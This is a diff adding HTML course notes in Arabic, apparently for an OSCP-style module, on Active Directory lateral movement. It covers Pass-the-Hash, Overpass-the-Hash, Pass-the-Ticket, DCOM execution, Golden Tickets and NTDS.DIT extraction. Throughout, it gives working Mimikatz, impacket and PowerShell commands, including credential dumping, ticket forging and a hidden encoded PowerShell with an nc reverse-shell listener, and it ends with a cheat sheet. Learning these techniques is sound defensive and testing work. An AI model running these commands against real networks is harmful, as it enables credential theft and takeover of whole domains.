+<li>مش بيشتغل ضد خدمات بتفرض Kerberos-only auth</li>
+</ul>
+
+<h3>كيف يحقق PtH تنفيذ الكود</h3>
+<ul>
+<li>اتصال عبر SMB (445) → إتمام مصادقة NTLM بالهاش المسروق → إنشاء خدمة ويندوز على الهدف بتشغّل مفسّر أوامر أو PowerShell → تواصل عبر Named Pipes خلال SCM → استلام شل تفاعلي</li>
+<li>لو محتاج وصول للملفات بس — مفيش داعي لخدمة، المصادقة وتصفّح المشاركات كافية</li>
+</ul>
+
+<div class="callout danger">
+<div class="callout-label">قيود مهمة</div>
+<p>PtH بيشتغل بس مع حساب <strong>Administrator المحلي المدمج (RID 500)</strong> — قيود UAC البعيدة بتمنعه مع باقي حسابات الأدمن المحلية على ويندوز الحديثة. لكنه بيشتغل مع <strong>حسابات الدومين</strong> لأنها بتتخطّى هذه القيود. المبدأ الجوهري: NTLM بيشتغل زي ما هو مصمَّم — الهجوم بيستغل إن الهاش نفسه اتسرق، والهدف مش قادر يفرّق بين هاش مسروق وهاش شرعي.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">impacket-psexec — pth from linux</span><pre><code>impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH \
+  Administrator@192.168.50.72
+
+[*] Requesting shares on 192.168.50.72...
+[*] Found writable share ADMIN$
+[*] Uploading file ...
+[*] Opening SVCManager on 192.168.50.72...
+C:\Windows\system32> whoami
+nt authority\system
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU6 -->
+<h2 id="lu6"><span class="num">06</span><span class="htext">Overpass-the-Hash (OPtH)</span></h2>
+
+<h3>الفكرة</h3>
+<ul>
+<li>OPtH بيحوّل NTLM hash لـ Kerberos TGT — بدل استخدام الهاش في مصادقة NTLM مباشرة، بيُستخدم لطلب TGT من الـ KDC</li>
+<li>بمجرد الحصول على TGT → التحوّل الكامل لمصادقة Kerberos</li>
+<li>أكثر تخفّيًا من PtH الكلاسيكي: مفيش أي حركة NTLM على الشبكة، Kerberos هو البروتوكول الافتراضي والمتوقَّع في بيئات AD، وبيتخطّى الدفاعات اللي بتراقب أو بتمنع استخدام NTLM تحديدًا</li>
+</ul>
+
+<h3>خطوة بخطوة</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">اختراق جهاز</div>
+<div class="step-body"><p>الوصول كأدمن لجهاز عليه جلسة نشطة أو حديثة لمستخدم مميَّز (مثلًا jeffadmin).</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">استخراج هاش NTLM</div>
+<div class="step-body"><p>استخدام Mimikatz (<code>sekurlsa::logonpasswords</code>) لتفريغ هاش jeffadmin من ذاكرة LSASS.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">تشغيل Process بالهاش</div>
+<div class="step-body"><p>أمر <code>sekurlsa::pth</code> بيحقن الهاش وبيشغّل عملية جديدة بسياق أمان jeffadmin.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">طلب Kerberos TGT</div>
+<div class="step-body"><p>الوصول لأي مورد دومين (مشاركة ملفات مثلًا) — النظام تلقائيًا بيتواصل مع الـ KDC ويطلب TGT.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">التحقق من TGT في Cache</div>
+<div class="step-body"><p>تشغيل <code>klist</code> للتأكد إن التذكرة محفوظة باسم jeffadmin@CORP.COM.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">6</div>
+<div class="step-title">التحرّك جانبيًا</div>
+<div class="step-body"><p>استخدام PsExec أو أدوات تانية — هتستخدم تذاكر Kerberos من الجلسة بدل NTLM.</p></div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">mimikatz — sekurlsa::pth</span><pre><code>privilege::debug
+sekurlsa::logonpasswords
+# لاحظ هاش NTLM الخاص بـ jeffadmin
+
+sekurlsa::pth /user:jeffadmin /domain:corp.com /ntlm:2a944a7... /run:powershell
+# نافذة PowerShell جديدة بسياق jeffadmin
+
+ls \\FILES01\shares   # أي مورد دومين
+klist                 # jeffadmin@CORP.COM TGT cached!
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU7 -->
+<h2 id="lu7"><span class="num">07</span><span class="htext">Pass-the-Ticket (PtT)</span></h2>
+
+<h3>الفكرة الأساسية</h3>
+<ul>
+<li>PtT بيعيد استخدام تذاكر خدمة Kerberos (TGS) مسروقة من جلسة مستخدم آخر</li>
+<li>الفرق عن OPtH: OPtH بيسرق هاش → بيولّد TGT → بيطلب TGS. PtT بيسرق TGS موجودة فعلًا → بيحقنها مباشرة → بيستخدم الخدمة</li>
+<li>الـ TGT مرتبطة بالجهاز، لكن تذاكر TGS ممكن تُعاد استخدامها على أجهزة تانية</li>
+<li>محتاج صلاحية أدمن لاستخراج تذاكر من جلسة مستخدم آخر — لو هتحقن تذاكر جلستك إنت مش محتاج أدمن</li>
+</ul>
+
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">إيجاد الجلسات النشطة</div>
+<div class="step-body"><p>استخدام BloodHound أو <code>Get-NetSession</code> لإيجاد أجهزة فيها جلسات نشطة لمستخدمين مميَّزين.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">أخذ صلاحية أدمن على الجهاز ده</div>
+<div class="step-body"><p>اختراق الجهاز اللي تذاكر المستخدم الهدف متخزّنة فيه جوه LSASS.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">تصدير تذاكر Kerberos</div>
+<div class="step-body"><p><code>sekurlsa::tickets /export</code> — بيحفظ كل التذاكر كملفات .kirbi.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">اختيار التذكرة المناسبة</div>
+<div class="step-body"><p>اختيار TGS للخدمة المطلوبة (مثلًا CIFS لمشاركة ملفات، HTTP لتطبيق ويب).</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">حقن التذكرة في الجلسة</div>
+<div class="step-body"><p><code>kerberos::ptt [ticket.kirbi]</code> — بيحقن التذكرة في جلسة تسجيل الدخول الحالية.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">6</div>
+<div class="step-title">الوصول للخدمة الهدف</div>
+<div class="step-body"><p>الاتصال بالخدمة — المصادقة هتستخدم التذكرة المحقونة وتظهر بهوية المستخدم الشرعي.</p></div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">mimikatz — export / inject ticket</span><pre><code>sekurlsa::tickets /export
+ls *.kirbi
+# [0;xxx]-0-0-40810000-dave@cifs-FILES04.kirbi
+
+kerberos::ptt [0;xxx]-0-0-40810000-dave@cifs-FILES04.kirbi
+# Injecting ticket: OK
+
+klist
+# dave@CORP.COM TGS for FILES04 present!
+
+ls \\FILES04\Docshare   # بقت متاحة!
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU8 -->
+<h2 id="lu8"><span class="num">08</span><span class="htext">الحركة الجانبية عبر DCOM</span></h2>
+
+<h3>ما هو DCOM؟</h3>
+<ul>
+<li>Distributed Component Object Model — امتداد لـ COM (إطار تواصل مكوّنات مايكروسوفت) عبر أجهزة الشبكة بدل الجهاز الواحد</li>
+<li>مدمج في ويندوز من أقدم الإصدارات — مسموح عادة عبر الجدران النارية الداخلية باعتباره ترافيك إداري "عادي"، وبيستخدم مكوّنات ويندوز موثوقة من غير أي Malware خارجي</li>
+<li>التواصل عبر RPC على TCP port 135</li>
+</ul>
+
+<h3>DCOM عبر MMC — تنفيذ أوامر عن بُعد</h3>
+<ul>
+<li>MMC (Microsoft Management Console) بتوفّر واجهات برمجية قابلة للأتمتة، وواجهة DCOM بتاعتها بتسمح بإنشاء أوبجكتس عن بُعد — الأدمنز المحليين عندهم الصلاحية دي افتراضيًا</li>
+<li>الميثود <code>ExecuteShellCommand</code> بتشغّل أمر شل على الأوبجكت البعيد — تنفيذ كود عن بُعد عبر بنية تحتية ويندوز موثوقة، وبيشتغل جوه Session 0 (غير مرئي للمستخدم)</li>
+</ul>
+<div class="code-wrap"><span class="code-tag">powershell — dcom mmc execution</span><pre><code>$dcom = [System.Activator]::CreateInstance(
+  [type]::GetTypeFromProgID('MMC20.Application','192.168.50.72'))
+
+$dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c calc.exe','7')
+# calc.exe بيشتغل على الجهاز البعيد (Session 0)
+
+$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -enc <B64>','7')
+nc -lvnp 4444   # استقبال الـ reverse shell
+</code></pre></div>
+
+<div class="callout note">
+<div class="callout-label">ليه DCOM فعّال للتخفّي</div>
+<p>بيستخدم وظائف ويندوز الشرعية، مفيش Binaries خبيثة بتتنسخ للهدف، وكل النشاط عبر مكوّنات موقَّعة من مايكروسوفت. من منظور الدفاع: أحداث تفعيل DCOM في سجل Security (تفاصيل محدودة)، إنشاء عملية فرعية تحت MMC (Event ID 4688)، واتصال شبكي على المنفذ 135 + منفذ ديناميكي عالٍ. بيندمج مع الترافيك المؤسسي العادي لأن أدمنز الـ IT بيستخدموا أدوات DCOM روتينيًا.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU9 -->
+<h2 id="lu9"><span class="num">09</span><span class="htext">الاستمرارية في AD — Golden Ticket</span></h2>
+
+<h3>ليه الاستمرارية حرجة في AD</h3>
+<ul>
+<li>لازم تنجو من: إعادة تشغيل النظام، إعادة تعيين كلمات المرور، باتشات الأمان، الاستجابة للحوادث</li>
+<li>الاستمرارية على مستوى الدومين = تحكّم في كل المستخدمين والأجهزة والسياسات — تقنية واحدة ممكن تحافظ على الوصول لمئات الأنظمة في نفس الوقت</li>
+<li>كل التذاكر (TGTs) موقَّعة بهاش كلمة مرور حساب KRBTGT — بس الـ Domain Controller عارف المفتاح ده. لو المهاجم عرفه → يقدر يزوّر أي TGT</li>
+</ul>
+
+<h3>حساب KRBTGT — المفتاح الرئيسي للدومين</h3>
+<div class="callout danger">
+<div class="callout-label">التأثير</div>
+<p>لو المهاجم حصل على هاش KRBTGT: يقدر يزوّر TGTs لأي مستخدم — حتى غير موجودين فعليًا — ويقدر يخصّص أي عضويات مجموعات بما فيها Domain Admins. الدومين بيثق في التذكرة المزوَّرة لأنها موقَّعة بشكل صحيح.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">mimikatz — forge golden ticket</span><pre><code># الحصول على هاش KRBTGT عبر DCSync:
+lsadump::dcsync /user:corp\krbtgt
+# Hash NTLM: 1693c6...
+
+# الحصول على SID الدومين:
+whoami /user
+# S-1-5-21-1987370270-658905905-1781884369-1105
+# SID الدومين = احذف الجزء الأخير (-1105)
+
+# تزوير Golden Ticket وحقنه مباشرة:
+kerberos::golden /user:jen /domain:corp.com \
+  /sid:S-1-5-21-1987370270-658905905-1781884369 \
+  /krbtgt:1693c6... /ptt
+# jen بقى عنده تذكرة مزوَّرة بصلاحيات DA!
+</code></pre></div>
+
+<div class="method-grid">
+<div class="method-card"><span class="mnum">خصائص</span><div class="mtitle">صلاحية وكشف</div><div class="mdesc">بيشتغل بس مع Kerberos — الاتصالات بـ IP بتعمل Fallback لـ NTLM فتفشل التذكرة، فاستخدم أسماء المضيفين دايمًا. الصلاحية الافتراضية 10 ساعات لكن ممكن تتضبط لأي قيمة — بعض المهاجمين بيحطوا 10 سنين للاستمرارية. Event ID 4769 وتشفير RC4 في بيئة AES-only من علامات الاكتشاف.</div></div>
+<div class="method-card"><span class="mnum">دفاعات</span><div class="mtitle">تدوير KRBTGT مرتين</div><div class="mdesc">التدوير الأول بيبطّل التذاكر القديمة، التاني بيعالج تأخير الـ Replication — لازم الاثنين خلال 10 ساعات للمعالجة الكاملة. راقب تذاكر Kerberos الشاذة (RC4 في بيئة AES-only، صلاحيات غريبة) وفعّل Protected Users group للحسابات المميَّزة.</div></div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU10 -->
+<h2 id="lu10"><span class="num">10</span><span class="htext">Shadow Copies وNTDS.DIT</span></h2>
+
+<h3>Volume Shadow Copy Service (VSS)</h3>
+<ul>
+<li>تقنية مايكروسوفت للـ Snapshots اللحظية للأقراص/الملفات — غرضها الشرعي: النسخ الاحتياطي والاسترجاع بدون توقّف</li>
+<li>قاعدة بيانات <code>NTDS.DIT</code> على الـ DC مقفولة عادة من نظام التشغيل ومينفعش تتنسخ مباشرة أثناء التشغيل — Shadow Copy بينشئ نسخة قابلة للقراءة بتتخطّى القفل</li>
+<li>يتطلّب صلاحيات Domain Admin أو ما يعادلها على الـ DC</li>
+</ul>
+
+<h3>ما هو NTDS.DIT؟</h3>
+<ul>
+<li>قاعدة بيانات Active Directory — موجودة في <code>C:\Windows\NTDS\ntds.dit</code> على كل الـ Domain Controllers</li>
+<li>تحتوي بيانات اعتماد لكل Object في الدومين: هاشات NTLM، مفاتيح Kerberos (AES 128/256، DES، RC4)، سجل كلمات المرور، وهاش حساب KRBTGT نفسه</li>
+<li>محتاج كمان SYSTEM registry hive اللي فيه الـ Boot Key (SYSKEY) اللازم لفك تشفير NTDS.DIT — من غيره القاعدة مينفعش تتحلّل</li>
+</ul>
+
+<h3>تدفّق الهجوم الكامل</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">إنشاء VSS Snapshot</div>
+<div class="step-body"><p>استخدام <code>vshadow.exe</code> أو <code>wmic</code> لعمل نسخة ظل من قرص C: على الـ DC.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">تصفّح النسخة الظل</div>
+<div class="step-body"><p>الوصول للـ Snapshot عبر مساره: <code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN</code>.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">نسخ NTDS.DIT</div>
+<div class="step-body"><p>نسخ <code>ntds.dit</code> من مسار الـ Shadow Copy لمكان قابل للكتابة (<code>C:\Temp\ntds.dit</code>).</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">تصدير SYSTEM hive</div>
+<div class="step-body"><p><code>reg.exe save HKLM\SYSTEM C:\Temp\SYSTEM</code> — يحتوي مفتاح فك التشفير.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">نقل الملفات</div>
+<div class="step-body"><p>تهريب <code>ntds.dit</code> وملف SYSTEM لجهاز المهاجم للتحليل الأوفلاين.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">6</div>
+<div class="step-title">استخراج كل الهاشات</div>
+<div class="step-body"><p>استخدام <code>impacket-secretsdump</code> أوفلاين لفك تشفير NTDS.DIT واستخراج كل بيانات اعتماد الدومين.</p></div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">windows — shadow copy extraction</span><pre><code>vshadow.exe -nw -p C:
+# لاحظ مسار الـ shadow device في المخرجات
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\temp\ntds.dit
+reg.exe save hklm\system C:\temp\SYSTEM
+</code></pre></div>
+<div class="code-wrap"><span class="code-tag">linux — impacket-secretsdump offline</span><pre><code>impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+# كل هاشات الدومين اتستخرجت!
+</code></pre></div>
+
+<div class="method-grid">
+<div class="method-card"><span class="mnum">كشف</span><div class="mtitle">علامات الاكتشاف</div><div class="mdesc">Event ID 7036 (بدء خدمة VSS)، Event ID 8193 (إنشاء Shadow Copy)، نشاط VSS غير متوقَّع على الـ DCs، وصول لـ ntds.dit من مسار غير قياسي، تصدير SYSTEM hive عبر reg.exe، أو نقل ملفات كبير من DC لجهاز غير DC.</div></div>
+<div class="method-card"><span class="mnum">دفاع</span><div class="mtitle">إجراءات دفاعية</div><div class="mdesc">راقب نشاط VSS على كل الـ DCs، قيّد الوصول للـ DCs لحسابات النسخ الاحتياطي والأدمنز المصرَّح لهم فقط، استخدم Privileged Access Workstations ونموذج الإدارة الطبقي (Tier 0/1/2) لمنع اختلاط بيانات الاعتماد.</div></div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ METHODOLOGY -->
+<h2 id="methodology"><span class="num">--</span><span class="htext">منهجية الحركة الجانبية المتكاملة</span></h2>
+<p>في تقييم حقيقي، الترتيب المنطقي للتقنيات بيعتمد على مستوى بيانات الاعتماد المتاحة ودرجة التخفّي المطلوبة.</p>
+<div class="diagram-card">
+<svg viewBox="0 0 700 150" xmlns="http://www.w3.org/2000/svg">
+  <rect x="5" y="55" width="110" height="55" rx="7" class="dsvg-box-b"/>
+  <text x="60" y="78" text-anchor="middle" class="dsvg-blue" font-size="11" font-weight="700">تعداد الجلسات</text>
+  <text x="60" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">BloodHound</text>
+
+  <rect x="155" y="55" width="110" height="55" rx="7" class="dsvg-box-a"/>
+  <text x="210" y="78" text-anchor="middle" class="dsvg-amber" font-size="11" font-weight="700">OPtH / PtT</text>
+  <text x="210" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">الأكثر تخفّيًا</text>
+
+  <rect x="305" y="55" width="110" height="55" rx="7" class="dsvg-box"/>
+  <text x="360" y="78" text-anchor="middle" class="dsvg-txt" font-size="11" font-weight="700">WMI/WinRM/DCOM</text>
+  <text x="360" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">أدوات مدمجة</text>
+
+  <rect x="455" y="55" width="110" height="55" rx="7" class="dsvg-box-r"/>
+  <text x="510" y="78" text-anchor="middle" class="dsvg-red" font-size="11" font-weight="700">PsExec/PtH</text>
+  <text x="510" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">أعلى ضجيج</text>
+
+  <rect x="585" y="55" width="110" height="55" rx="7" class="dsvg-box-g"/>
+  <text x="640" y="78" text-anchor="middle" class="dsvg-green" font-size="11" font-weight="700">DA → Golden Ticket</text>
+  <text x="640" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">استمرارية</text>
+
+  <line x1="115" y1="82" x2="155" y2="82" class="dsvg-line"/>
+  <line x1="265" y1="82" x2="305" y2="82" class="dsvg-line"/>
+  <line x1="415" y1="82" x2="455" y2="82" class="dsvg-line"/>
+  <line x1="565" y1="82" x2="585" y2="82" class="dsvg-line"/>
+</svg>
+<div class="diagram-caption">رتّب التقنيات من الأكثر تخفّيًا للأكثر ضجيجًا حسب درجة الحساسية المطلوبة في التقييم</div>
+</div>
+<ul>
+<li>ابدأ دايمًا بـ Overpass-the-Hash أو Pass-the-Ticket لو التذاكر متاحة — أثر شبكي أقل من NTLM المباشر</li>
+<li>استخدم WMI/WinRM/DCOM لو محتاج تختبئ وسط ترافيك إداري طبيعي</li>
+<li>PsExec وPtH خيار أخير لو السرعة أهم من التخفّي — تذكّر إنهم بيسجّلوا Event 7045</li>
+<li>بمجرد الوصول لـ Domain Admin — نفّذ DCSync واحفظ KRBTGT، وفكّر في Shadow Copy لو محتاج نسخة كاملة من NTDS.DIT</li>
+</ul>
+
+<hr />
+
+<!-- ══════════════════════════════════ CHEAT SHEET -->
+<h2 id="cheat"><span class="num">--</span><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+
+<h4>أوامر WMI وWinRM السريعة</h4>
+<div class="code-wrap"><span class="code-tag">quick reference</span><pre><code>Invoke-CimMethod -CimSession $sess -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd.exe /c whoami'}
+winrs -r:TARGET -u:DOMAIN\user -p:PASS cmd
+New-PSSession -ComputerName TARGET -Credential $cred | Enter-PSSession
+</code></pre></div>
+
+<h4>أوامر PsExec وPass-the-Hash</h4>
+<div class="code-wrap"><span class="code-tag">quick reference</span><pre><code>PsExec64.exe -i \\TARGET -u DOMAIN\user -p PASS cmd
+impacket-psexec -hashes LM:NTLM Administrator@TARGET
+impacket-wmiexec -hashes LM:NTLM DOMAIN/user@TARGET
+</code></pre></div>
+
+<h4>أوامر Mimikatz الأساسية (OPtH / PtT / Golden Ticket)</h4>
+<div class="code-wrap"><span class="code-tag">mimikatz — quick reference</span><pre><code>privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:powershell
+sekurlsa::tickets /export
+kerberos::ptt &lt;ticket.kirbi&gt;
+lsadump::dcsync /user:corp\krbtgt
+kerberos::golden /user:&lt;user&gt; /domain:&lt;domain&gt; /sid:&lt;SID&gt; /krbtgt:&lt;hash&gt; /ptt
+</code></pre></div>
+
+<h4>Shadow Copy وNTDS.DIT</h4>
+<div class="code-wrap"><span class="code-tag">quick reference</span><pre><code>vshadow.exe -nw -p C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\windows\ntds\ntds.dit C:\temp\
+reg.exe save hklm\system C:\temp\SYSTEM
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+</code></pre></div>
+
+<h4>Quick Wins — أسرع المسارات في الحركة الجانبية</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>#</th><th>التحقق</th><th>الأمر</th><th>التقنية المناسبة</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>عندك NTLM hash لحساب أدمن محلي مدمج؟</td><td><code>impacket-psexec -hashes</code></td><td>Pass-the-Hash</td></tr>
+<tr><td>2</td><td>عندك هاش لحساب دومين مميَّز؟</td><td><code>sekurlsa::pth</code></td><td>Overpass-the-Hash</td></tr>
+<tr><td>3</td><td>فيه جلسة نشطة لمستخدم مميَّز على جهاز تحت سيطرتك؟</td><td><code>sekurlsa::tickets /export</code></td><td>Pass-the-Ticket</td></tr>
+<tr><td>4</td><td>عضو في Local Administrators على الهدف؟</td><td><code>Invoke-CimMethod</code> / <code>winrs</code></td><td>WMI / WinRM</td></tr>
+<tr><td>5</td><td>عندك هاش KRBTGT؟</td><td><code>kerberos::golden</code></td><td>Golden Ticket</td></tr>
+</tbody>
+</table></div>
+
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ SUMMARY -->
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>الموديول ده غطّى الحركة الجانبية في Active Directory من أبسط أدواتها المدمجة (WMI، WinRM، PsExec) وصولًا لأقوى تقنيات إعادة استخدام بيانات الاعتماد (PtH، OPtH، PtT)، وانتهى بأخطر مرحلتين: Golden Ticket للاستمرارية، وShadow Copy لتفريغ الدومين بالكامل.</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./module21_summary.txt</div>
+<ul>
+<li>الحركة الجانبية بتعتمد على بيانات اعتماد مُستخرَجة — هاشات NTLM، تذاكر Kerberos، Tokens — مش كلمات مرور نصية</li>
+<li>WMI وWinRM أدوات ويندوز مدمجة بتندمج مع الترافيك الشرعي — ده بيصعّب الكشف</li>
+<li>PsExec محتاج وصول لمشاركة ADMIN$ — بينسخ Binary خدمة، فهو أكثر ضجيجًا لكن لسه منتشر جدًا في الاختراقات الحقيقية</li>
+<li>Pass-the-Hash بيعيد استخدام الهاش مباشرة — بيشتغل بس مع خدمات تقبل NTLM، وبيتوقف أمام إعدادات Kerberos-only</li>
+<li>Overpass-the-Hash بيحوّل الهاش لـ TGT — حركة أكثر تخفّيًا باستخدام بروتوكول Kerberos</li>
+<li>Pass-the-Ticket بيحقن TGS مسروقة في الجلسة — مرتبط بخدمة محددة لكنه قوي لو التذكرة لمستخدم مميَّز</li>
+<li>Golden Tickets بتزوّر TGTs باستخدام هاش KRBTGT — استمرارية على مستوى الدومين تنجو من إعادة تعيين كل كلمات المرور التانية</li>
+<li>Shadow Copies بتكشف NTDS.DIT — مع SYSTEM hive، كل هاشات الدومين ممكن تتستخرج وتُستخدم لهجمات تانية</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>كل تقنيات الحركة الجانبية دي مبنية على فكرة واحدة:</strong> النظام بيثق في بيانات الاعتماد المقدَّمة — هاش، تذكرة، أو توكن — من غير ما يقدر يفرّق بينها وبين بيانات اعتماد سُرقت فعلًا. المختبر اللي بيفهم أي شكل من بيانات الاعتماد متاح له في كل لحظة، وأنسب تقنية لاستغلاله، هو اللي بيتحرك جوه الدومين بأقل أثر وأسرع وقت.</p>
+</blockquote>
+
+<div class="callout examtip">
+<div class="callout-label">Professional Mindset</div>
+<p>في الـ Engagement الحقيقي: ابدأ دايمًا بالتقنيات الأكثر تخفّيًا المتاحة حسب بيانات الاعتماد الموجودة (OPtH أو PtT لو عندك تذاكر أو هاشات دومين) → بعدين الأدوات المدمجة (WMI/WinRM/DCOM) لو محتاج تختبئ وسط ترافيك إداري → PsExec وPtH المباشر كخيار أخير أسرع لكنه أكثر ضجيجًا → وأخيرًا، لو وصلت لـ DA، نفّذ DCSync واحفظ KRBTGT، وفكّر في Shadow Copy لنسخة كاملة من بيانات الدومين. وثَّق كل خطوة، حتى الفاشلة.</p>
+</div>
+
+<hr />
+<p><em>نهاية نوتس الموديول الحادي والعشرين — Lateral Movement in Active Directory</em></p>
+<div class="footer-note">-- EOF: module-21/lateral-movement.md --</div>
+
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement,btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement,s=h.scrollTop,ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');s>500?t.classList.add('show'):t.classList.remove('show');}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var c=wrap.querySelector('code');if(!c)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){if(navigator.clipboard){navigator.clipboard.writeText(c.innerText).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
